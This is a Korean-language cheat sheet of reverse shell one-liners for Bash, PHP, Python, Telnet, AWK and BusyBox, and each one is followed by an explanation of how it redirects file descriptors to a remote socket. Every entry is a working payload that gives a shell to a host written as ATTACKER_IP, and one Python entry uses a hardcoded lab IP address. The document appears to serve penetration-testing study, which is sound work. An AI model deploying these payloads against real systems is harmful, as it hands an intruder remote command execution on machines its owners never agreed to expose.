### **Bash (배시)**

Bash는 리눅스 및 유닉스 계열 시스템에서 가장 널리 사용되는 셸입니다. 아래 명령어들은 표준 입출력과 파일 디스크립터 조작을 통해 리버스 셸을 생성합니다.

- **Normal Bash Reverse Shell**: `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1`

  - **분석**: 이 명령어는 **Bash**의 대화형(interactive) 셸을 시작하고(`-i`), 모든 표준 입출력 및 표준 에러(`>&`)를 `/dev/tcp/ATTACKER_IP/443`으로 리디렉션하여 공격자에게 연결합니다. 마지막의 `0>&1`은 표준 입력(0)을 표준 출력(1)과 동일하게 만들어 공격자가 입력한 명령어를 셸이 읽도록 합니다. 이로써 완벽한 양방향 통신이 가능해집니다.

- **Bash Read Line Reverse Shell**: `exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done`

  - **분석**: 이 명령어는 새로운 **파일 디스크립터(File Descriptor)** `5`를 생성하여 공격자의 IP와 포트에 대한 양방향 연결을 설정합니다. `cat <&5`로 공격자의 명령어를 파일 디스크립터 5로부터 읽어 `while read line` 루프로 전달하며, 각 명령어를 실행합니다(`$line`). 명령어의 표준 출력(Standard Output)과 표준 에러(Standard Error)는 모두 파일 디스크립터 5로 다시 리디렉션되어 공격자에게 전달됩니다. 이는 명령어 라인 단위로 실행되는 비대화형 셸입니다.

- **Bash With File Descriptor 196 Reverse Shell**: `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196`

  - **분석**: 이 명령어는 임의의 파일 디스크립터 `196`을 사용하여 TCP 연결을 생성합니다. `exec 196<>/dev/tcp/ATTACKER_IP/443`을 통해 양방향 연결을 설정한 후, `sh` 셸의 표준 입출력 및 표준 에러를 모두 파일 디스크립터 196으로 리디렉션합니다. 첫 번째 `0<&196`은 표준 입력(0)을 196으로 리디렉션하는 부분으로, 사실상 `exec` 명령에 의해 통합되는 과정입니다. 이 스크립트는 `sh` 셸을 사용합니다.

- **Bash With File Descriptor 5 Reverse Shell**: `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`
  - **분석**: 첫 번째 명령어와 유사하지만, 특정 파일 디스크립터 `5`를 사용하여 연결을 설정합니다. `5<> /dev/tcp/ATTACKER_IP/443`은 파일 디스크립터 5를 공격자 IP의 TCP 연결에 대한 양방향 스트림으로 엽니다. 이후 `0<&5 1>&5 2>&5`를 통해 표준 입출력과 에러를 모두 이 파일 디스크립터 5로 리디렉션하여 완전한 양방향 셸을 만듭니다.

---

### **PHP (피에이치피)**

PHP는 웹 애플리케이션 개발에 널리 사용되는 언어로, 웹 서버 취약점을 통해 리버스 셸을 생성할 때 주로 사용됩니다.

- **PHP Reverse Shell Using the exec Function**: `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'`

  - **분석**: PHP의 `fsockopen` 함수를 사용하여 공격자의 IP와 포트 443에 소켓 연결을 생성합니다. 이 소켓은 파일 디스크립터 `3`으로 할당됩니다. 이후 `exec` 함수를 사용해 `sh` 셸을 실행하고, 이 셸의 표준 입출력과 에러를 소켓 파일 디스크립터 `3`으로 리디렉션하여 공격자에게 셸을 제공합니다.

- **PHP Reverse Shell Using the shell_exec, system, passthru, popen Function**:
  - **분석**: 이 명령어들은 모두 `exec` 함수와 유사한 방식으로 동작하지만, 셸 명령어를 실행하는 PHP 함수의 차이만 있습니다.
    - `shell_exec`: 명령어를 실행하고 모든 출력을 하나의 문자열로 반환합니다.
    - `system`: 명령어를 실행하고, 실행 결과를 즉시 출력하며, 마지막 라인의 반환값을 반환합니다.
    - `passthru`: 명령어를 실행하고 원시(raw) 출력을 직접 반환합니다. 이는 바이너리 데이터 작업에 유용합니다.
    - `popen`: 명령어 실행을 위한 프로세스 파일 포인터(pipe)를 엽니다. 이는 양방향 통신에 사용될 수 있습니다.

---

### **Python (파이썬)**

Python은 범용 프로그래밍 언어로, 라이브러리를 통해 네트워크 기능을 쉽게 구현할 수 있어 리버스 셸에 자주 사용됩니다.

- **Python Reverse Shell by Exporting Environment Variables**: `export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`

  - **분석**: `RHOST`와 `RPORT` 환경 변수에 공격자 IP와 포트를 설정합니다. Python 스크립트는 이 환경 변수를 읽어 소켓 연결을 생성하고(`socket.socket()`), `os.dup2()` 함수를 사용하여 소켓의 파일 디스크립터(s.fileno())를 표준 입력(0), 표준 출력(1), 표준 에러(2)로 모두 복제(duplicate)합니다. 마지막으로, `pty.spawn("bash")`를 통해 의사 터미널(`Pseudo Terminal`)을 생성하여 대화형 셸을 제공합니다.

- **Python Reverse Shell Using the subprocess Module**: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

  - **분석**: 앞의 스크립트와 거의 동일한 기능을 수행합니다. `socket.AF_INET` 및 `socket.SOCK_STREAM`을 명시하여 IPv4 TCP 소켓을 생성하고, `subprocess` 모듈을 사용하려 했지만 실제로는 `os.dup2`와 `pty.spawn`을 사용하여 셸을 실행합니다.

- **Short Python Reverse Shell**: `python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
  - **분석**: 앞의 두 스크립트를 더 간결하게 압축한 형태입니다. 핵심 기능(소켓 연결, 파일 디스크립터 복제, 셸 실행)은 모두 동일합니다.

---

### **Others (기타)**

다른 유틸리티들도 네트워크 연결 기능을 활용하여 리버스 셸을 만들 수 있습니다.

- **Telnet**: `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF`

  - **분석**: `mktemp -u`로 고유한 임시 파일 이름을 생성하고, `mkfifo` 명령으로 이 이름을 가진 **파이프(named pipe)**를 만듭니다. `telnet`으로 공격자의 서버에 연결한 후, `0<$TF`로 파이프에서 입력을 받아 `sh`로 전달하고, `1>$TF`로 셸의 출력을 파이프로 다시 보냅니다. 이는 파이프를 통해 양방향 통신을 구현하는 방식입니다.

- **AWK**: `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`

  - **분석**: AWK의 내장 TCP 기능인 `/inet/tcp`를 사용하여 공격자와 통신합니다. `getline`으로 공격자로부터 명령어를 읽고(`c`), `do...while` 루프를 통해 이를 실행하며 결과를 다시 `s |& ...`를 통해 공격자에게 보냅니다. AWK 스크립트 자체가 루프와 조건문을 포함하고 있어 복잡한 로직을 구현합니다.

- **BusyBox**: `busybox nc ATTACKER_IP 443 -e sh`
  - **분석**: **BusyBox**는 여러 유닉스 유틸리티를 하나의 실행 파일로 묶은 경량화된 도구입니다. 이 명령어는 BusyBox에 내장된 `nc` (넷캣) 유틸리티를 사용합니다. `-e` 옵션은 연결이 성공하면 지정된 프로그램(`sh`)을 실행하도록 지시하여 리버스 셸을 생성합니다.
